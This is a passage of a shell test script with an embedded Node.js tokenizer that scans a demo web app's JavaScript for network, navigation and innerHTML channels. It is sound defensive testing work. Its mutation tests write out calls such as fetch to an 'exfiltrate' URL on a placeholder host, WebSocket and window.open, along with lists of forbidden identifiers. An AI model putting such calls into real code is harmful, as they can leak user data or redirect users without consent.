  if (!isCallCalleeSuffix(before)) return new Set();
  let calleeEnd = openIdx - 1;
  if (before.value === '?.') calleeEnd = openIdx - 2;
  if (calleeEnd < 0) return new Set();
  // Unknown callees (IIFEs, unmodeled expressions) are opaque, not
  // file-level indeterminate. Fail closed only happens when a known
  // channel is involved (handled by member/computed checks).
  const ctx = { indeterminate: false };
  const callee = consumeExprEndingAt(tokens, calleeEnd, ctx);
  if (ctx.indeterminate) return new Set();
  return callee.names || new Set();
}

function detect(tokens) {
  const ctx = { indeterminate: false };
  const hits = [];

  function hit(kind) { hits.push(kind); }

  for (let i = 0; i < tokens.length; i++) {
    const tok = tokens[i];
    const next = i + 1 < tokens.length ? tokens[i + 1] : null;
    const prev = i > 0 ? tokens[i - 1] : null;

    if (tok.kind === 'ident' && FORBIDDEN_IDENTS[tok.value]) {
      hit('ident:' + tok.value);
    }

    if (tok.kind === 'ident' && tok.value === 'fetch') {
      if (next && next.kind === 'punct' && next.value === '(') hit('fetch-call');
      else if (next && next.kind === 'punct' && next.value === '?.' &&
               i + 2 < tokens.length && tokens[i + 2].kind === 'punct' && tokens[i + 2].value === '(') {
        hit('fetch-call');
      }
    }

    if (tok.kind === 'punct' && tok.value === '(') {
      const names = calleeNamesAtCall(tokens, i);
      if (names.has('fetch')) hit('fetch-call');
    }

    if (tok.kind === 'ident' && tok.value === 'import') {
      if (next && next.kind === 'punct' && next.value === '(') hit('dynamic-import');
    }

    if (tok.kind === 'ident' && tok.value === 'new') {
      const ctor = constructorIdent(tokens, i + 1);
      if (ctor === 'Worker') hit('new-Worker');
    }

    if (tok.kind === 'ident' && tok.value === 'location' && !isDotTok(prev)) {
      if (isAssignTarget(tokens, i, i)) hit('bare-location-assign');
    }

    if (tok.kind === 'punct' && (tok.value === '.' || tok.value === '?.')) {
      checkMember(tokens, i, ctx, hit);
      if (ctx.indeterminate) return { ok: false, error: 'indeterminate-member', hits: hits };
    }

    if (tok.kind === 'punct' && tok.value === '[' && isComputedMemberOpen(tokens, i)) {
      checkComputed(tokens, i, ctx, hit);
      if (ctx.indeterminate) return { ok: false, error: 'indeterminate-computed', hits: hits };
    }
  }

  return { ok: true, hits: hits };
}

function checkMember(tokens, dotIndex, ctx, hit) {
  if (dotIndex < 1) return;
  const prop = tokens[dotIndex + 1];
  if (!prop || prop.kind !== 'ident') return;
  const name = prop.value;
  const rec = consumeExprEndingAt(tokens, dotIndex - 1, ctx);
  if (ctx.indeterminate) return;
  const assign = isAssignTarget(tokens, rec.start, dotIndex + 1);
  applyMemberRule(name, rec.globals, assign, hit);
}

function checkComputed(tokens, openIdx, ctx, hit) {
  const close = matchingClose(tokens, openIdx);
  if (close < 0) { ctx.indeterminate = true; return; }
  const recEnd = receiverEndBeforeComputed(tokens, openIdx);
  if (recEnd < 0) { ctx.indeterminate = true; return; }
  const rec = consumeExprEndingAt(tokens, recEnd, ctx);
  if (ctx.indeterminate) return;
  const key = constantKey(tokens, openIdx + 1, close - 1);
  if (key === null) {
    if (rec.globals.has('window') || rec.globals.has('location') ||
        rec.globals.has('document') || rec.globals.has('globalThis')) {
      ctx.indeterminate = true;
    }
    return;
  }
  const assign = isAssignTarget(tokens, rec.start, close);
  applyMemberRule(key, rec.globals, assign, hit, {
    call: isCallAfter(tokens, close + 1),
    construct: isConstructExpr(tokens, rec.start)
  });
}

function isCallAfter(tokens, idx) {
  if (idx >= tokens.length) return false;
  const t = tokens[idx];
  if (t.kind === 'punct' && t.value === '(') return true;
  if (t.kind === 'punct' && t.value === '?.' &&
      idx + 1 < tokens.length && tokens[idx + 1].kind === 'punct' &&
      tokens[idx + 1].value === '(') {
    return true;
  }
  return false;
}

function isConstructExpr(tokens, exprStart) {
  if (exprStart < 0 || exprStart >= tokens.length) return false;
  let i = exprStart;
  while (i > 0 && tokens[i - 1].kind === 'punct' && tokens[i - 1].value === '(') {
    const open = i - 1;
    if (!isGroupingParenOpen(tokens, open)) break;
    i = open;
  }
  const at = tokens[i];
  if (at && at.kind === 'ident' && at.value === 'new') return true;
  if (i === 0) return false;
  const before = tokens[i - 1];
  return !!(before && before.kind === 'ident' && before.value === 'new');
}

function applyMemberRule(name, globals, assign, hit, extras) {
  extras = extras || {};
  if (name === 'open' && isGlobalObject(globals)) hit('window.open');
  if (name === 'location' && globals.has('document')) hit('document.location');
  if (name === 'location' && isGlobalObject(globals) && assign) hit('window.location=');
  if (LOCATION_PROPS[name] && globals.has('location')) hit('location.' + name);
  if (name === 'innerHTML' && assign) hit('innerHTML=');
  if (FORBIDDEN_IDENTS[name]) hit('ident:' + name);
  if (name === 'fetch' && extras.call) hit('fetch-call');
  if (name === 'Worker' && extras.construct) hit('new-Worker');
}

function checkSource(src) {
  const lex = tokenize(src);
  if (!lex.ok) return { exit: 2, error: lex.error, hits: [] };
  const det = detect(lex.tokens);
  if (!det.ok) return { exit: 2, error: det.error, hits: det.hits || [] };
  if (det.hits.length) return { exit: 1, error: null, hits: det.hits };
  return { exit: 0, error: null, hits: [] };
}

const file = process.env.OJ_FORBIDDEN_TARGET;
if (!file) {
  process.stderr.write('forbidden-js-check: missing target path\n');
  process.exit(2);
}
let src;
try { src = fs.readFileSync(file, 'utf8'); }
catch (e) {
  process.stderr.write('forbidden-js-check: read failed\n');
  process.exit(2);
}
const result = checkSource(src);
if (process.env.OJ_FORBIDDEN_DEBUG) {
  process.stderr.write(JSON.stringify(result) + '\n');
}
process.exit(result.exit);

NODE
}

check_forbidden_js "$APP_JS" && ok "no forbidden network/navigation/innerHTML token in app.js" || bad "a forbidden network/navigation/innerHTML token was found in app.js"

grep -qF "'Demo complete. No code was changed or deployed.'" "$APP_JS" && ok "RESULT_TEXT is the exact required sentence in app.js" || bad "exact result sentence not found verbatim in app.js"

UNQUALIFIED_RE='\b(Shipped|Verified|Live)\b'
UNQUALIFIED_HIT=0
for f in "$INDEX_HTML" "$APP_JS" "$README_MD"; do
  grep -qE "$UNQUALIFIED_RE" "$f" && UNQUALIFIED_HIT=1
done
[[ "$UNQUALIFIED_HIT" -eq 0 ]] && ok "no unqualified Shipped/Verified/Live claim anywhere in the prototype" || bad "found an unqualified Shipped/Verified/Live token"

# =============================================================================
# Section 4 — static scan of styles.css
# =============================================================================
echo
echo "static scan (styles.css)"

check_css_clean() {
  ! grep -qiE '@import|url\(\s*["'"'"']?(https?:)?//' "$1"
}
check_css_clean "$STYLES_CSS" && ok "no @import and no remote/protocol-relative url(...) in styles.css" || bad "@import or remote/protocol-relative url(...) found in styles.css"

# =============================================================================
# Section 5 — mutation witnesses D-G (AC10): run the SAME check function
# against a deliberately broken copy of the real file and confirm it now
# fails, proving the tokenizer-based forbidden-channel sensor above is not
# vacuous.
# =============================================================================
echo
echo "mutation witnesses (static channels + wording)"

# D — network/external navigation surface. Covers a network request API AND
# an external-navigation assignment separately (Codex round-1 finding: a
# fetch()-only mutant proves nothing about navigation detection).
check_forbidden_js "$APP_JS" && ok "the real app.js has no forbidden channel to start with (baseline for D)" || bad "the real app.js already trips the forbidden-channel sensor — cannot run mutation witness D"

NET_MUTATIONS=(
  'fetch("https://example.invalid/exfiltrate");'
  $'fetch\n("https://example.invalid/exfiltrate");'
  'window.location = "https://example.invalid/";'
  $'window.location =\n  "https://example.invalid/";'
  $'window\n  .location =\n  "https://example.invalid/";'
  'new WebSocket("wss://example.invalid");'
  $'new\n  Worker("worker.js");'
  'window.open("https://example.invalid/");'
  $'import\n("https://example.invalid/exfiltrate.mjs");'
  # Proactive control for the round-7 dot-normalization fix: a real
  # window.open(...) call reformatted with the dot at end-of-line must
  # still be caught, not just tolerated as a false-positive fix.
  $'window.\n  open("https://example.invalid/");'
  # Codex round-8 finding: optional chaining still performs real navigation
  # when the left side exists, as it always does for window/location.
  'window?.open("https://example.invalid/");'
  'location?.assign("https://example.invalid/");'
  'location?.replace("https://example.invalid/");'
  # Codex round-9 finding: a parenthesized or guarded optional-chain base
  # still executes when the parenthesized expression evaluates to the real
  # object.
  '(window)?.open("https://example.invalid/");'
  '(shouldOpen && window)?.open("https://example.invalid/");'
  '(location)?.assign("https://example.invalid/");'
  '(document)?.location;'
  # Codex round-10 finding: formatter whitespace between nested closers,
  # and `||` fallbacks that still evaluate to the real global.
  '((window) )?.open("https://example.invalid/");'
  '((window) ).location = "https://example.invalid/";'
  '((location) )?.href;'
  '((location) )?.assign("https://example.invalid/");'
  '((location) )?.replace("https://example.invalid/");'
  '((document) )?.location;'
  $'(\n  (window)\n)?.open("https://example.invalid/");'
  '(window || fallbackWindow)?.open("https://example.invalid/");'
  '(location || fallbackLocation).href;'
  '(document || fallbackDocument)?.location;'
  # Codex round-11 finding: closers BEFORE the fallback operator still
  # evaluate to the real global when it is truthy.
  '((window) || fallbackWindow)?.open("https://example.invalid/");'
  '((location) ?? fallbackLocation)?.assign("https://example.invalid/");'
  '((document) || fallbackDocument)?.location;'
  '((window) || (fallbackWindow))?.open("https://example.invalid/");'
  # Codex round-12 finding: grouped || fallback with closers before the
  # operator, split across lines. The receiver can still be window.
  $'((window) || (\n  fallbackWindow\n))?.open("https://example.invalid/");'
)
NET_ALL_CAUGHT=1
for mutation in "${NET_MUTATIONS[@]}"; do
  mutant_file="$TMP_DIR/app.mutant-net-$(echo "$mutation" | cksum | cut -d' ' -f1).js"
  cp "$APP_JS" "$mutant_file"
  printf '\n%s\n' "$mutation" >> "$mutant_file"
  check_forbidden_js "$mutant_file" && NET_ALL_CAUGHT=0
done
[[ "$NET_ALL_CAUGHT" -eq 1 ]] && ok "mutation witness (network/external-navigation channel): fetch (plain and paren-split), single-line/multiline/dot-split window.location assignment, WebSocket, split new Worker, window.open, and paren-split import() are each individually detected" || bad "mutation witness (network/external-navigation channel) missed at least one injected channel"

# D2 — false-positive control: ordinary, non-navigating code that merely
# mentions "location" as a property name, a read, or a comparison must NOT
# trip the sensor (Codex round-2 finding: an earlier, broader regex flagged
# `const current = window.location;`, `window.location === cached`,
# `model.location = "local"`, and even a string literal containing the text
# "window.location" — none of which perform navigation).
BENIGN_LOCATION_SNIPPETS=(
  'var current = window.location;'
  'if (window.location === cached) { return; }'
  'model.location = "local";'
  'var msg = "window.location";'
  # Codex round-4 finding: a `new`-suffixed identifier immediately followed
  # by an unrelated `Worker.reset()` call on the next line, once flattened
  # to one line, contains the literal substring "new Worker" purely by
  # coincidence — this constructs no worker.
  $'const renew = true\nconst Worker = { reset() {} }\nconst shouldRenew = renew\nWorker.reset()'
  # Codex round-5 findings: "window" had no LEFT identifier boundary, so an
  # identifier merely ENDING in "window" false-matched...
  $'const mainwindow = {};\nmainwindow\n  .location = "local";'
  # ...and grep's `\b` does not know `$` is a legal JS identifier character,
  # so a `$`-prefixed variable before "Worker"...
  $'const $new = true;\nconst Worker = { reset() {} };\nconst shouldRenew = $new\nWorker.reset()'
  # ...and a `$`-suffixed class name after "new" both slipped past a
  # `\b`-only boundary.
  $'class Worker$Factory {}\nconst localObject = new Worker$Factory();'
  # Proactive control (same root cause, not yet demonstrated by Codex but
  # closed by the same both-sided-boundary fix): an identifier merely
  # ending in "fetch" is not a call to the forbidden global.
  'function prefetchData() { return 1; }'
  # Codex round-6 finding: the TERMINAL identifier in each member-access
  # alternative had no right boundary, so a longer, unrelated property name
  # starting with that word substring-matched.
  'function inspect(window) { return window.opened; }'
  'function inspect(location) { return location.hrefCache; }'
  'function inspect(document) { return document.locationCache; }'
  'location.assignment();'
  'location.replacement();'
  # Codex round-7 finding: an ordinary dot-at-end-of-line reformat puts a
  # SPACE (not a dot) immediately before "location" once flattened, which
  # the bare-location exclusion's single-preceding-character check missed.
  $'const model = {};\nmodel.\n  location = "local";'
  # Proactive control for the same fix, other direction: an identifier
  # merely SHARING "window" via a dot-at-end-of-line split is still not the
  # global object.
  $'const w = window;\nw.\n  location = "local";'
  # Codex round-10 finding: a helper that takes the global as an argument
  # and returns some other receiver is not a grouped-global member access.
  'adapter(window)?.open("local-panel");'
  'snapshot(location).href;'
  'adapter(location).replace("local-state");'
  'snapshot(document).location;'
  'adapter(window).location = "local-state";'
  # Codex round-11 finding: grouped fallbacks inside a helper argument
  # are still helper-return member access, not grouped-global receivers.
  'adapter((window || fallbackWindow))?.open("local-panel");'
  'snapshot((location || fallbackLocation)).href;'
  'adapter((location ?? fallbackLocation)).replace("local-state");'
  'snapshot((document || fallbackDocument)).location;'
  'adapter(((window)))?.open("local-panel");'
  # Codex round-12 finding: helper call whose argument is a grouped
  # fallback, with the call parens themselves split across lines. .open
  # is invoked on the helper return value, not on window.
  $'adapter(\n  (window || fallbackWindow)\n)?.open("local-panel");'
)
BENIGN_ALL_CLEAN=1
for snippet in "${BENIGN_LOCATION_SNIPPETS[@]}"; do
  benign_file="$TMP_DIR/app.benign-net-$(echo "$snippet" | cksum | cut -d' ' -f1).js"
  cp "$APP_JS" "$benign_file"
  printf '\n%s\n' "$snippet" >> "$benign_file"
  check_forbidden_js "$benign_file" || BENIGN_ALL_CLEAN=0
done
[[ "$BENIGN_ALL_CLEAN" -eq 1 ]] && ok "false-positive control: plain reads/comparisons, unrelated properties, string literals, \$-containing identifiers, a coincidental cross-line \"new...Worker\" substring, and longer property names sharing a prefix with a forbidden term all pass cleanly" || bad "the forbidden-channel sensor false-positives on ordinary, non-navigating code"


# Tokenizer/expression adversarial matrix. Each case is appended to a copy of
# the real app.js and run through the same check_forbidden_js. Every claimed
# lexer/expression branch has a dedicated case.
echo
echo "tokenizer/expression adversarial matrix"

assert_forbidden_snippet() {
  local name="$1"
  local snippet="$2"
  local mutant_file
  mutant_file="$TMP_DIR/app.lex-mut-$(echo "$name" | cksum | cut -d' ' -f1).js"
  cp "$APP_JS" "$mutant_file"
  printf '\n%s\n' "$snippet" >> "$mutant_file"
  if check_forbidden_js "$mutant_file"; then
    bad "tokenizer mutation missed: $name"
  else
    ok "tokenizer mutation detected: $name"
  fi
}

assert_clean_snippet() {
  local name="$1"
  local snippet="$2"
  local benign_file
  benign_file="$TMP_DIR/app.lex-benign-$(echo "$name" | cksum | cut -d' ' -f1).js"
  cp "$APP_JS" "$benign_file"
  printf '\n%s\n' "$snippet" >> "$benign_file"
  if check_forbidden_js "$benign_file"; then
    ok "tokenizer control clean: $name"
  else
    bad "tokenizer false-red: $name"
  fi
}

# Newly added fixtures must be syntactically valid JavaScript. A malformed
# snippet that happens to fail-closed is not a successful forbidden detection.
snippet_is_valid_js() {
  local snippet="$1"
  local syntax_file
  syntax_file="$TMP_DIR/snippet-syntax-$(echo "$snippet" | cksum | cut -d' ' -f1).js"
  printf '%s\n' "$snippet" > "$syntax_file"
  node --check "$syntax_file" >/dev/null 2>&1
}

assert_forbidden_valid_snippet() {
  local name="$1"
  local snippet="$2"
  local mutant_file
  local rc
  if ! snippet_is_valid_js "$snippet"; then
    bad "malformed fixture (not credited as forbidden): $name"
    return
  fi
  mutant_file="$TMP_DIR/app.lex-mut-$(echo "$name" | cksum | cut -d' ' -f1).js"
  cp "$APP_JS" "$mutant_file"
  printf '\n%s\n' "$snippet" >> "$mutant_file"
  check_forbidden_js "$mutant_file"
  rc=$?
  if [[ "$rc" -eq 1 ]]; then
    ok "tokenizer mutation detected: $name"
  elif [[ "$rc" -eq 0 ]]; then
    bad "tokenizer mutation missed: $name"
  else
    bad "tokenizer indeterminate on valid JS: $name"
  fi
}

assert_clean_valid_snippet() {
  local name="$1"
  local snippet="$2"
  local benign_file
  local rc
  if ! snippet_is_valid_js "$snippet"; then
    bad "malformed fixture (not credited as clean): $name"
    return
  fi
  benign_file="$TMP_DIR/app.lex-benign-$(echo "$name" | cksum | cut -d' ' -f1).js"
  cp "$APP_JS" "$benign_file"
  printf '\n%s\n' "$snippet" >> "$benign_file"
  check_forbidden_js "$benign_file"
  rc=$?
  if [[ "$rc" -eq 0 ]]; then
    ok "tokenizer control clean: $name"
  elif [[ "$rc" -eq 1 ]]; then
    bad "tokenizer false-red: $name"
  else
    bad "tokenizer indeterminate on valid JS: $name"
  fi
}

assert_clean_snippet "forbidden names in a line comment" '// fetch("https://example.invalid/"); XMLHttpRequest; window.open("x");'
assert_clean_snippet "forbidden names in a block comment" '/* new Worker("w.js"); location.assign("x"); innerHTML = "y"; */'
assert_clean_snippet "forbidden names in an ordinary string" 'var msg = "window.open(x) fetch(y) new Worker";'
assert_clean_snippet "forbidden names in template raw text" 'var t = `location.assign("x") window.open("y")`;'
assert_clean_snippet "forbidden names in a regex literal" 'var r = /new Worker/; var r2 = /window\.open/;'
assert_forbidden_snippet "forbidden expression inside template interpolation" 'var t = `${window.open("x")}`;'
assert_forbidden_snippet "comments between receiver/operator/property" 'window/*c*/./*c*/open("https://example.invalid/");'
assert_forbidden_snippet "line comments in a fallback chain" $'(window // left\n  || /* mid */ fallbackWindow)?.open("https://example.invalid/");'
assert_forbidden_snippet "nested grouping around window" '(((window)))?.open("https://example.invalid/");'
assert_forbidden_snippet "|| later operand is window" '(fallbackWindow || window)?.open("https://example.invalid/");'
assert_forbidden_snippet "?? later operand is window" '(fallbackWindow ?? window)?.open("https://example.invalid/");'
assert_forbidden_snippet "?? first operand is window" '(window ?? fallbackWindow)?.open("https://example.invalid/");'
assert_forbidden_snippet "&& proceeding operand is window" '(other && window)?.open("https://example.invalid/");'
assert_clean_snippet "&& is not a fallback operator" '(window && other)?.open("local-panel");'
assert_clean_snippet "helper call with nested grouped fallback argument" $'adapter(\n  ((window) || (\n    fallbackWindow\n  ))\n)?.open("local-panel");'
assert_clean_snippet "longer $-legal identifiers" $'function $fetch() { return 1; }\nconst importScripts$ = 1;\nconst XMLHttpRequest2 = {};'
assert_clean_snippet "terminal-property prefixes remain distinct" $'window.opened();\nlocation.hrefCache;\nlocation.assignment();\nlocation.replacement();\ndocument.locationCache;'
assert_forbidden_snippet "constant computed window.open" 'window["open"]("https://example.invalid/");'
assert_forbidden_snippet "constant computed window.location assignment" "window['location'] = 'https://example.invalid/';"
assert_clean_snippet "constant computed decoy opened" 'window["opened"]("local-panel");'
assert_clean_snippet "constant computed decoy other receiver" 'foo["open"]("local-panel");'
assert_forbidden_snippet "XMLHttpRequest identifier" 'var X = XMLHttpRequest;'
assert_forbidden_snippet "sendBeacon identifier" 'navigator.sendBeacon("https://example.invalid/");'
assert_forbidden_snippet "EventSource identifier" 'new EventSource("/events");'
assert_forbidden_snippet "ServiceWorker identifier" 'var r = ServiceWorker;'
assert_forbidden_snippet "serviceWorker identifier" 'navigator.serviceWorker.register("sw.js");'
assert_forbidden_snippet "importScripts identifier" 'importScripts("worker.js");'
assert_forbidden_snippet "bare location assignment" 'location = "https://example.invalid/";'
assert_forbidden_snippet "grouped new Worker" 'new (Worker)("worker.js");'
assert_forbidden_snippet "fail closed on unterminated string" 'var x = "unterminated'

# Codex tokenizer round-1 finding 1: window.location is the navigation object.
assert_forbidden_snippet "window.location.assign" 'window.location.assign("https://example.invalid/");'
assert_forbidden_snippet "window.location.replace" 'window.location.replace("https://example.invalid/");'
assert_forbidden_snippet "window.location.href assignment" 'window.location.href = "https://example.invalid/";'
assert_forbidden_snippet "grouped window.location.assign" '(window.location).assign("https://example.invalid/");'
assert_forbidden_snippet "optional window.location.assign" 'window?.location.assign("https://example.invalid/");'
assert_forbidden_snippet "window.location optional assign" 'window.location?.assign("https://example.invalid/");'
assert_forbidden_snippet "comments and whitespace in window.location.assign" $'window  /*c*/ . /*c*/ location\n  .  assign("https://example.invalid/");'
assert_forbidden_snippet "constant computed window.location.assign" 'window["location"].assign("https://example.invalid/");'
assert_forbidden_snippet "constant computed window.location.replace" "window['location'].replace('https://example.invalid/');"
assert_forbidden_snippet "optional constant computed window.location.href assignment" 'window?.["location"].href = "https://example.invalid/";'
assert_forbidden_snippet "grouped window.location.replace" '(window.location).replace("https://example.invalid/");'
assert_forbidden_snippet "grouped window.location.href assignment" '(window.location).href = "https://example.invalid/";'
assert_clean_snippet "arbitrary foo.location.assign is not navigation" 'foo.location.assign("https://example.invalid/");'
assert_clean_snippet "arbitrary foo.location.replace is not navigation" 'foo.location.replace("https://example.invalid/");'
assert_clean_snippet "arbitrary foo.location.href assignment is not navigation" 'foo.location.href = "https://example.invalid/";'
assert_clean_snippet "window.location read stays clean" 'var current = window.location;'
assert_clean_snippet "window.location comparison stays clean" 'if (window.location === cached) { return; }'

# Codex tokenizer round-1 finding 2: destructuring assignment targets.
assert_forbidden_snippet "object destructuring window.location target" '({x: window.location} = source);'
assert_forbidden_snippet "array destructuring window.location target" '[window.location] = ["https://example.invalid/"];'
assert_forbidden_snippet "grouped object destructuring window.location target" '({x: (window.location)} = source);'
assert_forbidden_snippet "grouped array destructuring window.location target" '[(window.location)] = ["https://example.invalid/"];'
assert_forbidden_snippet "nested object destructuring window.location target" '({a: {b: window.location}} = source);'
assert_forbidden_snippet "nested array-in-object destructuring window.location target" '({a: [window.location]} = source);'
assert_forbidden_snippet "nested object-in-array destructuring window.location target" '[{x: window.location}] = source;'
assert_forbidden_snippet "destructuring default window.location target" '({x: window.location = "https://example.invalid/"} = source);'
assert_forbidden_snippet "computed object destructuring window.location target" '({x: window["location"]} = source);'
assert_clean_snippet "object literal window.location value is a read" 'var o = { x: window.location };'
assert_clean_snippet "declaration destructures from window" 'const { href } = window;'
assert_clean_snippet "arbitrary foo.location object destructuring target" '({x: foo.location} = source);'
assert_clean_snippet "arbitrary foo.location array destructuring target" '[foo.location] = ["https://example.invalid/"];'
assert_clean_snippet "computed key read of window.location is not an assignment target" 'arr[window.location] = "local";'

# Codex tokenizer round-1 finding 3: array literals vs computed / optional computed.
assert_clean_snippet "array literal map is not computed access" '["x"].map(String);'
assert_clean_snippet "optional computed read on unrelated object" 'foo?.["bar"];'
assert_clean_snippet "nested array literal map is not computed access" '[["x"]].map(String);'
assert_clean_snippet "ordinary computed read on unrelated object" 'foo["bar"];'
assert_clean_snippet "optional computed call on unrelated object" 'foo?.["bar"]();'
assert_clean_snippet "non-constant computed read on unrelated object" 'foo[bar];'
assert_forbidden_snippet "optional constant computed window.open" 'window?.["open"]("https://example.invalid/");'
assert_forbidden_snippet "fail closed on non-constant computed window key" 'window[dyn].assign("https://example.invalid/");'

# Codex tokenizer round-2 finding 1: qualified relevant-global member paths.
assert_forbidden_valid_snippet "qualified globalThis.window.open" 'globalThis.window.open("https://example.invalid/");'
assert_forbidden_valid_snippet "qualified globalThis.window.location.assign" 'globalThis.window.location.assign("https://example.invalid/");'
assert_forbidden_valid_snippet "qualified window.window.open" 'window.window.open("https://example.invalid/");'
assert_forbidden_valid_snippet "qualified globalThis.document.location" 'globalThis.document.location;'
assert_forbidden_valid_snippet "qualified constant computed globalThis.window.open" 'globalThis["window"]["open"]("x");'
assert_forbidden_valid_snippet "qualified optional globalThis.window.location.replace" 'globalThis?.window?.location?.replace("x");'
assert_forbidden_valid_snippet "grouped qualified globalThis.window.open" '(globalThis.window).open("x");'
assert_forbidden_valid_snippet "qualified computed window.window.location.href assignment" 'window["window"].location.href = "x";'
assert_forbidden_valid_snippet "qualified computed globalThis.document.location" 'globalThis["document"].location;'
assert_clean_valid_snippet "qualified mainwindow.opened stays distinct" 'globalThis.mainwindow.opened();'
assert_clean_valid_snippet "qualified document.locationCache stays distinct" 'foo.document.locationCache;'
assert_clean_valid_snippet "helper call with qualified globalThis.window argument" 'adapter(globalThis.window).open("local");'

# Codex tokenizer round-2 finding 2: slash lexical goal is delimiter-framed.
assert_forbidden_valid_snippet "object-literal division window.open" 'const q = {a: 1} / window.open("x") / 2;'
assert_forbidden_valid_snippet "object-literal division fetch" 'const q = {a: 1} / fetch("x") / 2;'
assert_forbidden_valid_snippet "nested object-literal division window.open" 'const q = {a:{b:1}} / window.open("x") / 2;'
assert_forbidden_valid_snippet "call-close division fetch" 'foo() / fetch("x") / 2;'
assert_forbidden_valid_snippet "group-close division window.open" '(value) / window.open("x") / 2;'
assert_forbidden_valid_snippet "array-close division fetch" '[1] / fetch("x") / 2;'
assert_clean_valid_snippet "if-header regex window.open" 'if (ok) /window.open/.test(text);'
assert_clean_valid_snippet "if-header regex fetch" 'if (ok) /fetch(x)/.test(text);'
assert_clean_valid_snippet "while-header regex window.open" 'while (ok) /window.open/.test(text);'
assert_clean_valid_snippet "for-header regex fetch" 'for (; ok;) /fetch(x)/.test(text);'
assert_clean_valid_snippet "with-header regex window.open" 'with (obj) /window.open/.test(text);'
assert_clean_valid_snippet "block-close regex fetch after if" 'if (ok) {} /fetch(x)/.test(text);'
assert_clean_valid_snippet "declaration regex-literal control" 'var r = /window.open/;'
assert_clean_valid_snippet "assignment regex-literal control" 'r = /fetch(x)/;'
assert_clean_valid_snippet "regex class and escaped slash" 'var r = /[window.open]/; var r2 = /window\/open/; var r3 = /[\/]/;'

# Codex tokenizer round-3 finding 1: only a global-object receiver promotes
# terminal window/document identity. Arbitrary local properties stay local.
assert_clean_valid_snippet "local foo.window.open is not navigation" 'foo.window.open("local-panel");'
assert_clean_valid_snippet "local computed foo.window.open is not navigation" 'foo["window"].open("local-panel");'
assert_clean_valid_snippet "local foo.document.location is not navigation" 'foo.document.location;'
assert_clean_valid_snippet "object-literal window.open is not navigation" '({window:{open(){}}}).window.open();'
assert_clean_valid_snippet "helper call with qualified globalThis.window argument stays opaque" 'adapter(globalThis.window).open("local");'
assert_forbidden_valid_snippet "globalThis.window.open remains forbidden" 'globalThis.window.open("x");'
assert_forbidden_valid_snippet "computed globalThis.window.open remains forbidden" 'globalThis["window"]["open"]("x");'
assert_forbidden_valid_snippet "globalThis.document.location remains forbidden" 'globalThis.document.location;'
assert_forbidden_valid_snippet "computed globalThis.document.location remains forbidden" 'globalThis["document"].location;'
assert_forbidden_valid_snippet "window.window.open remains forbidden" 'window.window.open("x");'
assert_clean_valid_snippet "arbitrary foo.location.assign stays clean" 'foo.location.assign("https://example.invalid/");'
assert_clean_valid_snippet "terminal-property prefixes stay distinct from window.open" 'window.opened();'

# Codex tokenizer round-3 finding 2: constant-computed spellings match the
# identifier/dot channel with the same call/new constraints.
assert_forbidden_valid_snippet "computed window.fetch call" 'window["fetch"]("x");'
assert_forbidden_valid_snippet "computed globalThis.fetch call" 'globalThis["fetch"]("x");'
assert_forbidden_valid_snippet "computed new globalThis.XMLHttpRequest" 'new globalThis["XMLHttpRequest"]();'
assert_forbidden_valid_snippet "computed navigator.sendBeacon" 'navigator["sendBeacon"]("x");'
assert_forbidden_valid_snippet "computed navigator.serviceWorker.register" 'navigator["serviceWorker"].register("x");'
assert_forbidden_valid_snippet "computed self.importScripts" 'self["importScripts"]("x");'
assert_forbidden_valid_snippet "computed new globalThis.Worker" 'new globalThis["Worker"]("worker.js");'
assert_forbidden_valid_snippet "computed new globalThis.WebSocket" 'new globalThis["WebSocket"]("ws://example.invalid/");'
assert_clean_valid_snippet "computed prefetchData decoy stays clean" 'window["prefetchData"]("x");'
assert_clean_valid_snippet "computed WorkerFactory decoy stays clean" 'globalThis["WorkerFactory"]();'
assert_clean_valid_snippet "object-literal fetch/sendBeacon keys are not computed members" 'const labels = {"fetch": "local", "sendBeacon": "local"};'
assert_clean_valid_snippet "computed fetch read without call stays clean" 'obj["fetch"];'

# Codex tokenizer round-3 finding 3: bare location as a destructuring
# assignment target is the same navigation assignment as location = ...
assert_forbidden_valid_snippet "object destructuring bare location target" '({x: location} = source);'
assert_forbidden_valid_snippet "array destructuring bare location target" '[location] = ["x"];'
assert_forbidden_valid_snippet "destructuring default bare location target" '({x: location = "x"} = source);'
assert_clean_valid_snippet "object-literal location value is a read" 'const o = {x: location};'
assert_clean_valid_snippet "array-literal location value is a read" 'const a = [location];'
assert_clean_valid_snippet "renamed destructure of location property is not a target" 'const {location: localLocation} = source;'

# Codex tokenizer round-3 finding 4: function/switch/catch bodies and
# return+ASI make the following { a block, so a following slash is regex.
assert_clean_valid_snippet "function-body close regex window.open" 'function f() {} /window.open/.test("x");'
assert_clean_valid_snippet "switch-body close regex fetch" 'switch (x) {} /fetch(x)/.test(text);'
assert_clean_valid_snippet "catch-body close regex fetch" 'try {} catch (e) {} /fetch(x)/.test(text);'
assert_clean_valid_snippet "return-ASI block then regex window.open" $'function f(){ return\n{a:1}\n/window.open/.test("x"); }'

# Codex tokenizer round-4 finding 1: direct globalThis open/location aliases
# are the same channels as window.open and global location.
assert_forbidden_valid_snippet "direct globalThis.open call" 'globalThis.open("x");'
assert_forbidden_valid_snippet "computed globalThis.open call" 'globalThis["open"]("x");'
assert_forbidden_valid_snippet "direct globalThis.location.assign" 'globalThis.location.assign("x");'
assert_forbidden_valid_snippet "computed globalThis.location.replace" 'globalThis["location"].replace("x");'
assert_forbidden_valid_snippet "direct globalThis.location.href assignment" 'globalThis.location.href = "x";'
assert_forbidden_valid_snippet "direct globalThis.location assignment" 'globalThis.location = "x";'
assert_clean_valid_snippet "globalThis.location read stays clean" 'const current = globalThis.location;'
assert_clean_valid_snippet "globalThis.opened stays distinct" 'globalThis.opened("local");'
assert_clean_valid_snippet "local foo.globalThis.open stays local" 'foo.globalThis.open("local");'
assert_clean_valid_snippet "local foo.globalThis.location.assign stays local" 'foo.globalThis.location.assign("local");'

# Codex tokenizer round-4 finding 2: function/class declaration close is a
# statement boundary (regex may follow); expression close is an expression
# (division may follow). Encoded as delimiter/body form metadata.
assert_forbidden_valid_snippet "function-expression close division fetch" 'const q = function() {} / fetch("x") / 2;'
assert_forbidden_valid_snippet "named function-expression close division window.open" 'const q = function f() {} / window.open("x") / 2;'
assert_forbidden_valid_snippet "async function-expression close division fetch" 'const q = async function() {} / fetch("x") / 2;'
assert_forbidden_valid_snippet "class-expression close division fetch" 'const q = class {} / fetch("x") / 2;'
assert_clean_valid_snippet "function-declaration close regex window.open" 'function f() {} /window.open/.test("x");'
assert_clean_valid_snippet "generator-declaration close regex fetch" 'function* f() {} /fetch(x)/.test(text);'
